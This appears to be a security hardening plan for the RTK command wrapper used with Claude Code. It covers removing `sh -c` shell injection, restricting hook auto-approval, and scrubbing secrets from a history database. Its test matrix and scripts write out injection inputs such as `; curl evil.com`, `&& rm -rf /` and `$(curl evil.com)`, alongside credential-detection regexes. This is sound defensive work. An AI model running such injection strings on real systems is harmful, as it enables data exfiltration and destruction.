# Phase 1 Deep Dive — Steps That Need Extra Care

Companion to the main implementation plan. Covers edge cases, architectural gotchas, and testing strategies for the three steps most likely to break things or miss something.

---

## DEEP DIVE: Step 2 — Replacing `sh -c` (Shell Injection Fix)

This is the highest-risk patch. Get it wrong and you either reintroduce the vulnerability or break legitimate command execution for 40+ command modules.

### 2.A Understanding WHERE `sh -c` Actually Lives

The Issue #640 audit (March 2026, commit `4467296`) identified `sh -c` in the old flat `src/runner.rs` and `src/summary.rs`. Since then, the codebase was **heavily refactored** in v0.34.3:

- `refacto-p1: unified cmds execution flow (+ rm dead code)` (commit `75bd607`)
- `refacto-p2: more standardize` (commits `47a76ea`, `92c671a`)
- `cmds: migrate remaining exit_code to exit_code_from_output` (commit `ba9fa34`)

The current architecture has **two distinct execution paths**:

**Path 1: Most commands (safe by design)** — Modules under `src/cmds/` build a `Command` using `resolved_command("binary")` then pass individual arguments with `.arg()`:

```rust
// Example from the architecture docs — this is SAFE
pub fn run(args: &[String], verbose: u8) -> Result<i32> {
    let mut cmd = resolved_command("mycmd");  // direct binary, no shell
    for arg in args {
        cmd.arg(arg);                         // each arg passed separately
    }
    runner::run_filtered(cmd, "mycmd", &args.join(" "), filter_fn, opts)
}
```

This path uses `std::process::Command::new("git")` / `Command::new("cargo")` etc. with individual `.arg()` calls. **No shell involved. No injection vector.** This covers: git, gh, cargo build/clippy, ls, read, grep, find, docker, kubectl, all linters, all test runners.

**Path 2: Runner (err/test) and Summary (DANGEROUS)** — `rtk err`, `rtk test`, and `rtk summary` take an arbitrary command string and pass it to `sh -c`:

```rust
// src/cmds/rust/runner.rs (formerly src/runner.rs)
// This is the DANGEROUS path
let command = args.join(" ");   // "cargo test" but could be "cargo test; evil"
Command::new("sh")
    .args(["-c", &command])     // Shell interprets everything
    .stdout(Stdio::piped())
    .stderr(Stdio::piped())
    .spawn()?;
```

**WHY do these use `sh -c`?** Because `rtk err` and `rtk test` are *wrappers around arbitrary commands*:
- `rtk test cargo test` → runs `cargo test`, filters to show failures only
- `rtk test npm test` → runs `npm test`, same filter
- `rtk err make build` → runs `make build`, shows errors only
- `rtk summary ls -la /tmp` → runs `ls -la /tmp`, summarizes output

The user can pass *any* command. That's the feature — but also the vulnerability.

### 2.B The Refactoring May Have Changed Things

**⚠️ CRITICAL: You MUST verify the current state before patching.** The refactoring commits (`refacto-p1`, `refacto-p2`) may have:

1. Moved runner.rs into `src/cmds/rust/runner.rs` or kept it in `src/core/runner.rs`
2. Changed how `rtk err` / `rtk test` dispatch (they might now use `run_filtered` too)
3. Added new `sh -c` paths you don't expect

**Your first action after cloning:**

```bash
# Find EVERY shell invocation — this is your ground truth
grep -rn 'Command::new("sh")' src/
grep -rn 'Command::new("bash")' src/
grep -rn 'Command::new("cmd")' src/
grep -rn '\.args(\["-c"' src/
grep -rn '\.arg("-c")' src/

# Also check for indirect shell invocation via std::process
grep -rn 'process::Command' src/ | grep -v test

# Check if runner.rs still uses sh -c or has been migrated
cat src/cmds/rust/runner.rs | head -50   # or wherever it lives now
cat src/cmds/system/summary.rs | head -50
```

Map every result. For each one, trace backwards to determine: **is the input user-controlled or is it a hardcoded binary name?**

### 2.C The `shlex` Approach vs. Metacharacter Guard — Tradeoffs

There are two strategies and they are NOT equivalent:

**Strategy A: Metacharacter Guard (Block + Reject)**

```rust
if contains_shell_metacharacters(&command_str) {
    eprintln!("rtk: refusing command with shell metacharacters");
    std::process::exit(1);
}
// Then use shlex::split + direct execution
```

Pros: Dead simple. If the string has `;`, `|`, `&&`, etc., refuse. No ambiguity.
Cons: **Breaks legitimate usage.** Someone typing `rtk err "cargo build && cargo test"` will get rejected. This was a supported use case.

**Strategy B: Always Direct Execution (Split + Exec, Never Shell)**

```rust
let tokens = shlex::split(&command_str)
    .unwrap_or_else(|| command_str.split_whitespace().map(String::from).collect());
let (bin, rest) = tokens.split_first().expect("empty command");
Command::new(bin).args(rest).output()?;
```

Pros: Works for simple commands without modification.
Cons: **Commands with pipes, redirects, or `&&` silently break.** `cargo build && cargo test` becomes a single command `cargo` with args `["build", "&&", "cargo", "test"]` — which cargo doesn't understand.

**Strategy C: Hybrid (Recommended for Acoustic)**

```rust
let command_str = args.join(" ");

// Check if the command contains shell operators
if contains_shell_operators(&command_str) {
    // Log the rejection with the specific operator found
    let operator = find_first_operator(&command_str);
    eprintln!(
        "rtk: command contains shell operator '{}': {}",
        operator, command_str
    );
    eprintln!(
        "rtk: split into separate commands for safety. \
         Example: run 'rtk test cargo build' and 'rtk test cargo test' separately."
    );
    std::process::exit(1);
}

// Safe: no shell operators, use direct execution
let tokens = shlex::split(&command_str)
    .context("Failed to parse command")?;
let (bin, rest) = tokens.split_first().context("Empty command")?;
let output = Command::new(bin)
    .args(rest)
    .stdout(Stdio::piped())
    .stderr(Stdio::piped())
    .output()
    .with_context(|| format!("Failed to execute: {}", bin))?;
```

Why this is best:
1. Clean commands (`cargo test --release`) work identically to before
2. Injection attempts (`cargo test; curl evil.com`) are blocked with a clear error
3. Legitimate compound commands (`cargo build && cargo test`) are blocked but with a helpful message explaining how to split them
4. The failure mode is **loud** (error message + exit 1), not silent

### 2.D Edge Cases That Will Bite You

**Edge case 1: Quoted arguments with spaces**

```bash
rtk test cargo test --filter "test name with spaces"
```

`args.join(" ")` produces `cargo test --filter test name with spaces` (quotes lost). When you `shlex::split` this, you get `["cargo", "test", "--filter", "test", "name", "with", "spaces"]` — **wrong.**

The fix: **Don't join and re-split.** Use the original `args: Vec<String>` directly:

```rust
// BETTER: use args as-is, they come pre-split from Clap
pub fn run(args: &[String], verbose: u8) -> Result<i32> {
    if args.is_empty() {
        bail!("No command specified");
    }

    // Check each arg for metacharacters (belt + suspenders)
    for arg in args {
        if contains_shell_operators(arg) {
            bail!("Argument contains shell operator: {}", arg);
        }
    }

    let (bin, rest) = args.split_first().unwrap();
    let output = Command::new(bin)
        .args(rest)
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .output()
        .with_context(|| format!("Failed to execute: {}", bin))?;
    // ...
}
```

This is actually the **cleanest** fix. Clap already parsed the arguments. You have a `Vec<String>`. Just pass them through. The `join(" ")` step that creates the shell injection opportunity was always unnecessary for execution — it was only needed because `sh -c` requires a single string.

**Edge case 2: Commands with `=` in arguments**

```bash
rtk test cargo test -- --test-threads=1
```

This should produce `["cargo", "test", "--", "--test-threads=1"]`. With `shlex::split` this works fine. With the direct `args` approach from Clap, this also works fine because Clap's `trailing_var_arg = true` captures everything.

**Edge case 3: PATH resolution**

`Command::new("cargo")` searches `$PATH` automatically. But what if the user types `rtk test ./scripts/run-tests.sh`? That needs to work too. `Command::new("./scripts/run-tests.sh")` will work as long as the file is executable. No special handling needed.

**Edge case 4: The Windows path**

On Windows, the current code uses `cmd /C` instead of `sh -c`. Your patch needs to handle both:

```rust
#[cfg(unix)]
fn execute_args(args: &[String]) -> Result<Output> {
    let (bin, rest) = args.split_first().context("Empty command")?;
    Command::new(bin).args(rest).output().context("exec failed")
}

#[cfg(windows)]
fn execute_args(args: &[String]) -> Result<Output> {
    let (bin, rest) = args.split_first().context("Empty command")?;
    Command::new(bin).args(rest).output().context("exec failed")
}
```

Actually, direct execution is cross-platform. You don't need platform-specific code anymore. The `sh -c` / `cmd /C` distinction only existed because they were using the shell. Remove the shell, remove the platform split.

### 2.E Interaction with `run_filtered`

The shared execution wrapper in `src/core/runner.rs` — `run_filtered()` — already takes a pre-built `Command` object:

```rust
// From architecture docs
pub fn run_filtered(
    cmd: Command,             // ← already built, ready to execute
    label: &str,
    raw_cmd: &str,            // for tracking/logging only
    filter_fn: fn(&str) -> String,
    opts: RunOptions,
) -> Result<i32> { ... }
```

This means **most commands are already safe** — they build the `Command` with direct binary + `.arg()` calls, then pass it to `run_filtered`. The problem is specifically in the `rtk err` / `rtk test` / `rtk summary` modules that build the `Command` using `sh -c`.

Your patch scope is therefore narrow: change how those 2-3 modules build the `Command` before passing it to `run_filtered`. The `run_filtered` function itself doesn't need changes.

### 2.F Testing Matrix

| Test case | Input | Expected behavior |
|---|---|---|
| Simple command | `rtk test cargo test` | Runs `cargo test`, shows filtered output |
| With flags | `rtk test cargo test --release -- --test-threads=1` | All flags passed correctly |
| With spaces in args | `rtk test cargo test --filter "my test"` | Filter value preserved |
| Injection semicolon | `rtk test cargo test; curl evil.com` | **ERROR** + exit 1 |
| Injection pipe | `rtk err npm build \| tee /tmp/leak` | **ERROR** + exit 1 |
| Injection && | `rtk test cargo test && rm -rf /` | **ERROR** + exit 1 |
| Injection subshell | `rtk err "$(curl evil.com)"` | **ERROR** + exit 1 |
| Injection backtick | `` rtk summary `whoami` `` | **ERROR** + exit 1 |
| Relative path binary | `rtk test ./scripts/test.sh` | Executes correctly |
| No args | `rtk test` | Clear error: "No command specified" |
| Exit code preserved | `rtk test cargo test` (with failures) | Returns non-zero exit code |
| Long arguments | `rtk err cargo build --features "a b c d"` | All features passed |

```bash
# Automated test script
#!/bin/bash
set -e
PASS=0; FAIL=0

run_test() {
    local desc="$1"; shift
    if "$@"; then
        echo "  PASS: $desc"; ((PASS++))
    else
        echo "  FAIL: $desc"; ((FAIL++))
    fi
}

expect_fail() {
    local desc="$1"; shift
    if "$@" 2>/dev/null; then
        echo "  FAIL (should have rejected): $desc"; ((FAIL++))
    else
        echo "  PASS (correctly rejected): $desc"; ((PASS++))
    fi
}

echo "=== Shell Injection Guard Tests ==="
run_test "simple cargo test" ./target/release/rtk test echo hello
run_test "with flags" ./target/release/rtk test echo -n hello
expect_fail "semicolon injection" ./target/release/rtk test "echo hello; echo INJECTED"
expect_fail "pipe injection" ./target/release/rtk test "echo hello | cat"
expect_fail "and-and injection" ./target/release/rtk test "echo hello && echo INJECTED"
expect_fail "subshell injection" ./target/release/rtk test 'echo $(whoami)'
expect_fail "backtick injection" ./target/release/rtk test 'echo `id`'

echo ""
echo "Results: $PASS passed, $FAIL failed"
```

---

## DEEP DIVE: Step 3 — Hook Permission Model

This is subtler than it looks. The interaction between the RTK hook and Claude Code's permission system has edge cases that aren't obvious from reading the code.

### 3.A How the Hook Protocol Actually Works

Claude Code's PreToolUse hook protocol (based on what we know from the RTK integration, the Discussion #671 notes, and the Copilot hook PR):

1. Claude Code decides to run a Bash command (e.g., `git status`)
2. It serializes a JSON request to the hook script via stdin:
   ```json
   {"tool_name": "Bash", "tool_input": {"command": "git status"}}
   ```
3. The hook script (`rtk-rewrite.sh`) receives this, runs `rtk rewrite "git status"`
4. If `rtk rewrite` returns a rewritten command, the hook outputs:
   ```json
   {
     "permissionDecision": "allow",
     "updatedInput": {"command": "rtk git status"}
   }
   ```
5. If no rewrite (unrecognized command), the hook outputs:
   ```json
   {}
   ```
   or in v0.35.0: `{"permissionDecision": "ask"}` (the new default)

The key insight: **`permissionDecision: "allow"` overrides Claude Code's built-in permission system.** When RTK says "allow", Claude Code skips the user prompt entirely. The user never sees the command.

### 3.B What v0.35.0's Fix Actually Does (and Doesn't Do)

The release note says `security: default to ask when no permission rule matches (#886)`. This means:

- **Unmatched commands** (things RTK doesn't know about) → now `"ask"` instead of silent passthrough
- **Matched commands** (things RTK rewrites) → **still `"allow"`**

So the v0.35.0 fix protects against unknown commands but does NOT address the Issue #640 concern. A rewritten `rtk git status` still gets auto-allowed. And the injection vector is in commands that DO get rewritten — `cargo test; evil` becomes `rtk test cargo test; evil` which IS a match, IS rewritten, and IS auto-allowed.

### 3.C The Three-Option Decision

**Option A: Remove `permissionDecision` entirely**

The hook outputs only `{"updatedInput": {"command": "rtk git status"}}`. Claude Code sees no permission decision, falls back to its native behavior, and prompts the user.

Impact:
- User sees a prompt for EVERY command Claude Code runs
- In a typical session, Claude might run 50-200 commands
- This creates severe prompt fatigue — users will start blindly approving
- Prompt fatigue arguably makes things LESS secure (users stop reading)

**Option B: Read-only allowlist**

```bash
# In rtk-rewrite.sh
SAFE_ALLOW=(
    "rtk git status"
    "rtk git log"
    "rtk git diff"
    "rtk ls"
    "rtk read"
    "rtk grep"
    "rtk find"
    "rtk git branch"
    "rtk git show"
    "rtk gh pr list"
    "rtk gh issue list"
    "rtk gh run list"
    "rtk deps"
    "rtk gain"
    "rtk discover"
)
```

Commands on this list → `"allow"` (auto-approved, user doesn't see prompt)
Commands NOT on this list → omit `permissionDecision` (Claude Code prompts user)

Impact:
- Read-only operations are seamless (most of the token savings)
- Write operations (`git add`, `git commit`, `git push`, `npm install`, `cargo build`) require user approval
- **`rtk test` and `rtk err` — the injection vectors — require user approval**
- This is the sweet spot: 70% of commands auto-allowed, 30% prompted, 100% of dangerous ones prompted

**Option C: Delegate to Claude Code's existing permission config**

Remove `permissionDecision` from the hook entirely, and configure Claude Code's own `.claude/settings.json` permission rules:

```json
{
  "permissions": {
    "allow": [
      "Bash(rtk git status*)",
      "Bash(rtk git log*)",
      "Bash(rtk git diff*)",
      "Bash(rtk ls*)",
      "Bash(rtk read*)",
      "Bash(rtk grep*)",
      "Bash(rtk find*)"
    ],
    "ask": [
      "Bash(rtk test*)",
      "Bash(rtk err*)",
      "Bash(rtk summary*)",
      "Bash(rtk git push*)",
      "Bash(rtk git commit*)"
    ]
  }
}
```

Impact:
- Cleanest separation of concerns — RTK handles rewriting, Claude Code handles permissions
- Managed through Claude Code's native config, not a bash script
- Users already understand Claude Code's permission model
- But: requires understanding Claude Code's permission glob syntax and keeping it in sync with the RTK rewrite registry

### 3.D Recommendation: Option B with Migration Path to C

Start with Option B (allowlist in the hook script). It's self-contained, requires no Claude Code config changes, and can be tested independently.

Then, once proven stable, migrate to Option C where Claude Code's native permissions manage authorization. Document both approaches so the team can choose.

### 3.E The Hook Script — What You're Actually Editing

The hook script is a bash script that uses `jq` for JSON processing. The flow:

```bash
#!/bin/bash
# ~/.claude/hooks/rtk-rewrite.sh

# Read JSON from stdin
input=$(cat)
tool_name=$(echo "$input" | jq -r '.tool_name')
command=$(echo "$input" | jq -r '.tool_input.command')

# Only intercept Bash commands
if [ "$tool_name" != "Bash" ]; then
    echo '{}'
    exit 0
fi

# Try to rewrite
rewritten=$(rtk rewrite "$command" 2>/dev/null)
exit_code=$?

if [ $exit_code -eq 0 ] && [ -n "$rewritten" ]; then
    # CURRENT (dangerous): auto-allow everything
    echo "{\"permissionDecision\": \"allow\", \"updatedInput\": {\"command\": \"$rewritten\"}}"
else
    # No rewrite — pass through
    echo '{}'
fi
```

Your patch for Option B:

```bash
#!/bin/bash
# ~/.claude/hooks/rtk-rewrite.sh
# ACOUSTIC PATCH: Selective auto-allow based on read-only allowlist

input=$(cat)
tool_name=$(echo "$input" | jq -r '.tool_name')
command=$(echo "$input" | jq -r '.tool_input.command')

if [ "$tool_name" != "Bash" ]; then
    echo '{}'
    exit 0
fi

rewritten=$(rtk rewrite "$command" 2>/dev/null)
exit_code=$?

if [ $exit_code -eq 0 ] && [ -n "$rewritten" ]; then
    # ACOUSTIC: Check if rewritten command is on the read-only safe list
    # Extract the rtk subcommand (first two words: "rtk git", "rtk ls", etc.)
    rtk_subcmd=$(echo "$rewritten" | awk '{print $1, $2}')

    case "$rtk_subcmd" in
        "rtk git")
            # Only allow read-only git operations
            git_op=$(echo "$rewritten" | awk '{print $3}')
            case "$git_op" in
                status|log|diff|branch|show|stash|remote|tag)
                    echo "{\"permissionDecision\": \"allow\", \"updatedInput\": {\"command\": \"$rewritten\"}}"
                    ;;
                *)
                    # git add/commit/push/pull/merge/rebase → ask
                    echo "{\"updatedInput\": {\"command\": \"$rewritten\"}}"
                    ;;
            esac
            ;;
        "rtk ls"|"rtk read"|"rtk grep"|"rtk find"|"rtk deps"|"rtk gain"|"rtk discover"|"rtk gh"|"rtk json"|"rtk wc"|"rtk smart")
            echo "{\"permissionDecision\": \"allow\", \"updatedInput\": {\"command\": \"$rewritten\"}}"
            ;;
        "rtk test"|"rtk err"|"rtk summary"|"rtk proxy"|"rtk env"|"rtk curl")
            # NEVER auto-allow execution/write/sensitive commands
            echo "{\"updatedInput\": {\"command\": \"$rewritten\"}}"
            ;;
        *)
            # Unknown rtk command → ask
            echo "{\"updatedInput\": {\"command\": \"$rewritten\"}}"
            ;;
    esac
else
    echo '{}'
fi
```

### 3.F Also Patch the Template in init.rs

The `rtk init -g` command generates this hook script from a template embedded in `src/hooks/init.rs`. If you only patch the installed script but not the template, the next `rtk init -g` will overwrite your changes.

```bash
# Find the hook template
grep -n 'rtk-rewrite\|permissionDecision\|PreToolUse' src/hooks/init.rs
```

Patch the template string inside `init.rs` to match your hook script changes. This way, `rtk init -g` always produces the hardened version.

### 3.G Testing

```bash
# After installing the patched hook

# 1. Read-only commands — should execute silently (no prompt)
# Have Claude Code run: git status, git log, ls, grep

# 2. Write commands — should show permission prompt
# Have Claude Code run: git commit, git push, npm install

# 3. Dangerous commands — should show permission prompt
# Have Claude Code run: cargo test, npm run build

# 4. Verify rewriting still works
# In Claude Code, run git status
# Check that the output is RTK-compressed (compact, not raw)

# 5. Verify hook JSON output
echo '{"tool_name":"Bash","tool_input":{"command":"git status"}}' | \
    ~/.claude/hooks/rtk-rewrite.sh
# Expected: {"permissionDecision": "allow", "updatedInput": {"command": "rtk git status"}}

echo '{"tool_name":"Bash","tool_input":{"command":"cargo test"}}' | \
    ~/.claude/hooks/rtk-rewrite.sh
# Expected: {"updatedInput": {"command": "rtk test cargo test"}}
# (no permissionDecision — Claude Code will prompt)

echo '{"tool_name":"Bash","tool_input":{"command":"cargo test; curl evil.com"}}' | \
    ~/.claude/hooks/rtk-rewrite.sh
# Expected: either {} (no rewrite) or rewrite without auto-allow
```

---

## DEEP DIVE: Step 4 — Argument Scrubbing in Tracking DB

### 4.A What Gets Stored and Where

From the architecture docs, the tracking schema is:

```sql
CREATE TABLE commands (
    id INTEGER PRIMARY KEY,
    timestamp TEXT NOT NULL,
    original_cmd TEXT NOT NULL,     -- ← raw command as typed
    rtk_cmd TEXT NOT NULL,          -- ← rewritten rtk command
    input_tokens INTEGER NOT NULL,
    output_tokens INTEGER NOT NULL,
    saved_tokens INTEGER NOT NULL,
    savings_pct REAL NOT NULL,
    exec_time_ms INTEGER DEFAULT 0
);
```

Both `original_cmd` and `rtk_cmd` store the full command string. The cleanup runs on every INSERT, deleting entries older than 90 days (via `HISTORY_DAYS` constant).

The DB file lives at `~/.local/share/rtk/history.db` with default permissions (probably 644, readable by any user with shell access to the machine).

### 4.B What Secrets Actually End Up There

In Acoustic's context, the realistic exposure paths are:

| Command pattern | What leaks |
|---|---|
| `rtk proxy curl -H "Authorization: Bearer sk-..."` | API tokens in headers |
| `rtk proxy curl -u user:password https://...` | Basic auth credentials |
| `rtk test DATABASE_URL=postgres://user:pass@... cargo test` | DB connection strings via env prefix |
| `rtk proxy aws s3 ls --profile prod` | Not direct secrets but reveals prod profile name |
| `rtk env -f AWS` | This one is filtered output, but tracking stores the original `env -f AWS` call |
| `kubectl exec -it pod -- env` | Triggers tracking of the exec command |

The `proxy` subcommand is the worst offender because it's designed for raw passthrough — the tracking module gets the full command string without any filtering.

### 4.C The Scrubbing Strategy — Defense in Depth

Layer 1: **Regex-based scrubbing** (catches known patterns)
Layer 2: **Argument redaction for excluded commands** (blanket protection for high-risk commands)
Layer 3: **Database file permissions** (OS-level protection)

### 4.D Regex Patterns — Be Comprehensive but Don't Break Things

The main risk with scrubbing is **false positives** — accidentally redacting non-secret values that look like secrets. This can break `rtk gain` statistics or make the tracking data useless for debugging.

**Pattern design principles:**

1. Only scrub the **value** part, preserve the key name for debugging
2. Be specific enough to avoid false positives on regular args
3. Test each pattern against common non-secret strings

```rust
use regex::Regex;
use once_cell::sync::Lazy;  // preferred over lazy_static in modern Rust

/// Patterns that match sensitive values in command strings.
/// Each tuple: (pattern, replacement_template)
///
/// IMPORTANT: These are applied to the FULL command string, not individual args.
/// Patterns must be anchored enough to avoid false positives.
static SCRUB_PATTERNS: Lazy<Vec<(Regex, &'static str)>> = Lazy::new(|| vec![

    // === Authorization headers ===
    // Matches: -H "Authorization: Bearer xxx" or --header "Authorization: Bearer xxx"
    (
        Regex::new(r#"(?i)(Authorization:\s*Bearer\s+)\S+"#).unwrap(),
        "${1}[REDACTED]"
    ),
    // Matches: -H "X-Api-Key: xxx" and similar
    (
        Regex::new(r#"(?i)(X-Api-Key:\s*)\S+"#).unwrap(),
        "${1}[REDACTED]"
    ),
    // Basic auth in URLs: https://user:pass@host
    (
        Regex::new(r#"(https?://[^:]+:)[^@]+(@)"#).unwrap(),
        "${1}[REDACTED]${2}"
    ),
    // curl -u user:password
    (
        Regex::new(r#"(?i)(-u\s+\S+:)\S+"#).unwrap(),
        "${1}[REDACTED]"
    ),

    // === AWS credentials ===
    // AWS Access Key IDs (always start with AKIA)
    (
        Regex::new(r"AKIA[A-Z0-9]{16}").unwrap(),
        "[AWS_ACCESS_KEY_REDACTED]"
    ),
    // AWS Secret Keys (40 chars, base64-ish)
    (
        Regex::new(r"(?i)(aws_secret_access_key[=:\s]+)[A-Za-z0-9/+=]{40}").unwrap(),
        "${1}[REDACTED]"
    ),

    // === Connection strings ===
    // PostgreSQL, MongoDB, MySQL, Redis with credentials
    (
        Regex::new(r"(?i)((?:postgres|mongodb|mysql|redis|amqp)(?:\+\w+)?://[^:]+:)[^@]+(@)").unwrap(),
        "${1}[REDACTED]${2}"
    ),

    // === Environment variable assignments with sensitive names ===
    // Catches: DATABASE_URL=xxx, API_KEY=xxx, SECRET=xxx, PASSWORD=xxx, TOKEN=xxx
    (
        Regex::new(r"(?i)((?:DATABASE_URL|DB_PASSWORD|API_KEY|SECRET_KEY|AUTH_TOKEN|ACCESS_TOKEN|PRIVATE_KEY|AWS_SECRET_ACCESS_KEY|AWS_SESSION_TOKEN|GITHUB_TOKEN|NPM_TOKEN|SLACK_TOKEN|OPENAI_API_KEY|ANTHROPIC_API_KEY)=)\S+").unwrap(),
        "${1}[REDACTED]"
    ),

    // === Generic JWT tokens ===
    // eyJ... pattern (base64-encoded JSON, min 20 chars)
    (
        Regex::new(r"eyJ[A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]{20,}").unwrap(),
        "[JWT_REDACTED]"
    ),
]);

pub fn scrub_command(cmd: &str) -> String {
    let mut result = cmd.to_string();
    for (pattern, replacement) in SCRUB_PATTERNS.iter() {
        result = pattern.replace_all(&result, *replacement).to_string();
    }
    result
}
```

### 4.E False Positive Testing

```rust
#[cfg(test)]
mod tests {
    use super::*;

    // === Should NOT be scrubbed (false positive guards) ===

    #[test]
    fn test_normal_git_commands_unchanged() {
        let cmd = "git commit -m 'fix: update API endpoint'";
        assert_eq!(scrub_command(cmd), cmd);
    }

    #[test]
    fn test_normal_cargo_test_unchanged() {
        let cmd = "cargo test --release --test-threads=4";
        assert_eq!(scrub_command(cmd), cmd);
    }

    #[test]
    fn test_grep_with_pattern_unchanged() {
        let cmd = "grep -rn 'password' src/";
        assert_eq!(scrub_command(cmd), cmd);
        // "password" in a grep PATTERN should not be redacted
    }

    #[test]
    fn test_url_without_credentials_unchanged() {
        let cmd = "curl https://api.example.com/v1/users";
        assert_eq!(scrub_command(cmd), cmd);
    }

    #[test]
    fn test_docker_command_unchanged() {
        let cmd = "docker ps --format '{{.Names}}'";
        assert_eq!(scrub_command(cmd), cmd);
    }

    // === Should BE scrubbed (true positive guards) ===

    #[test]
    fn test_bearer_token_scrubbed() {
        let cmd = r#"curl -H "Authorization: Bearer sk-abc123def456ghij""#;
        let result = scrub_command(cmd);
        assert!(!result.contains("sk-abc123def456ghij"));
        assert!(result.contains("[REDACTED]"));
    }

    #[test]
    fn test_basic_auth_url_scrubbed() {
        let cmd = "curl https://admin:supersecret@api.example.com/data";
        let result = scrub_command(cmd);
        assert!(!result.contains("supersecret"));
        assert!(result.contains("admin:"));  // username preserved
        assert!(result.contains("@api.example.com"));  // host preserved
    }

    #[test]
    fn test_aws_key_scrubbed() {
        let cmd = "aws s3 ls AKIAIOSFODNN7EXAMPLE";
        let result = scrub_command(cmd);
        assert!(!result.contains("AKIAIOSFODNN7EXAMPLE"));
    }

    #[test]
    fn test_connection_string_scrubbed() {
        let cmd = "DATABASE_URL=postgres://myuser:mypassword@localhost:5432/mydb cargo test";
        let result = scrub_command(cmd);
        assert!(!result.contains("mypassword"));
        assert!(result.contains("postgres://"));  // protocol preserved
        assert!(result.contains("@localhost"));    // host preserved
    }

    #[test]
    fn test_jwt_scrubbed() {
        let cmd = "curl -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozjgNryP4J3jVmNHl0w5N_XgL0n3I9PlFUP0THsR8U'";
        let result = scrub_command(cmd);
        assert!(!result.contains("eyJhbGciOiJIUzI1NiJ9"));
    }

    #[test]
    fn test_multiple_secrets_in_one_command() {
        let cmd = "GITHUB_TOKEN=ghp_abc123 API_KEY=sk-test curl -H 'Authorization: Bearer mytoken' https://user:pass@api.com";
        let result = scrub_command(cmd);
        assert!(!result.contains("ghp_abc123"));
        assert!(!result.contains("sk-test"));
        assert!(!result.contains("mytoken"));
        assert!(!result.contains("pass@"));
        // Structure should be preserved
        assert!(result.contains("GITHUB_TOKEN="));
        assert!(result.contains("API_KEY="));
        assert!(result.contains("https://"));
    }
}
```

### 4.F Database Permissions

After the code patches, also lock down the DB file:

```bash
# In the install script
chmod 600 ~/.local/share/rtk/history.db
# Only the owning user can read/write
```

In the Rust code, when creating the database:

```rust
#[cfg(unix)]
{
    use std::os::unix::fs::PermissionsExt;
    if let Ok(metadata) = std::fs::metadata(&db_path) {
        let mut perms = metadata.permissions();
        perms.set_mode(0o600);  // rw------- (owner only)
        std::fs::set_permissions(&db_path, perms).ok();
    }
}
```

### 4.G Retention Reduction — Where to Patch

From the architecture docs:

```sql
-- In tracking.rs, the cleanup query
DELETE FROM commands WHERE timestamp < datetime('now', '-90 days')
```

The constant to change:

```bash
grep -rn '90\|HISTORY_DAYS\|retention' src/core/tracking.rs
```

Change from 90 to 7:

```rust
// ACOUSTIC PATCH: Reduce retention from 90 days to 7 days
// 7 days is enough for rtk gain analytics while minimizing exposure window
const HISTORY_DAYS: i64 = 7;
```

**Note**: This affects `rtk gain --graph` (which shows 30 days). The graph will only have 7 days of data. That's acceptable — token savings analytics over 7 days is still useful, and the security benefit outweighs the analytics loss.

---

## APPENDIX: Verification Checklist — Run Before Declaring Phase 1 Complete

```
[ ] Binary makes zero network connections (strace/dtrace verified)
[ ] grep -rn 'Command::new("sh")' src/ returns ZERO results (or all results are in test code)
[ ] grep -rn 'permissionDecision.*allow' hooks/ returns ONLY allowlisted read-only commands
[ ] Injection test suite passes (all metacharacter commands rejected)
[ ] rtk test cargo test works correctly (exit code preserved, output filtered)
[ ] rtk test "cargo test; echo INJECTED" exits with error
[ ] Bearer tokens in curl commands are scrubbed in history.db
[ ] Connection strings are scrubbed in history.db
[ ] history.db has 600 permissions
[ ] history.db cleanup uses 7-day retention
[ ] Tee is disabled by default (no files in ~/.local/share/rtk/tee/)
[ ] env, proxy, curl are excluded from hook rewriting
[ ] cargo audit returns no vulnerabilities
[ ] cargo test passes (including new sanitize/scrub tests)
[ ] Claude Code session works end-to-end: rewrite + filter + permission prompts where expected
```
